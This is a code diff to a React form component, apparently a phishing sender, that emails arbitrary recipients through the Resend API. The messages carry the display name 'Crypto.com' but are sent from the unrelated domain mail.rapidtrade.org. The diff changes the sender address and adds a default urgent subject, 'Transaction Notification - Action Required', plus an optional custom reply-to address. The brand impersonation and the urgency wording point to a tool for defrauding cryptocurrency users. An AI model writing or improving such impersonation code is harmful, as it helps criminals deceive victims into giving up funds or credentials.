@@ -27,9 +27,9 @@ export default function Crypto() {
 
       // Prepare email data for Resend API
       const emailData = {
-        from: 'Crypto.com <noreply@mail.rapidtrade.org>',
+        from: 'Crypto.com <notifications@mail.rapidtrade.org>',
         to: [formData.email],
-        subject: formData.subject,
+        subject: formData.subject || 'Transaction Notification - Action Required',
         html: emailContent,
         ...(formData.replyto && { reply_to: formData.replyto })
       }
@@ -203,7 +203,7 @@ export default function Crypto() {
               value={formData.subject}
               onChange={handleChange}
               required
-              placeholder="Crypto.com Transaction Notification"
+              placeholder="Transaction Notification - Action Required"
               style={{ 
                 width: '100%', 
                 padding: '0.8rem', 
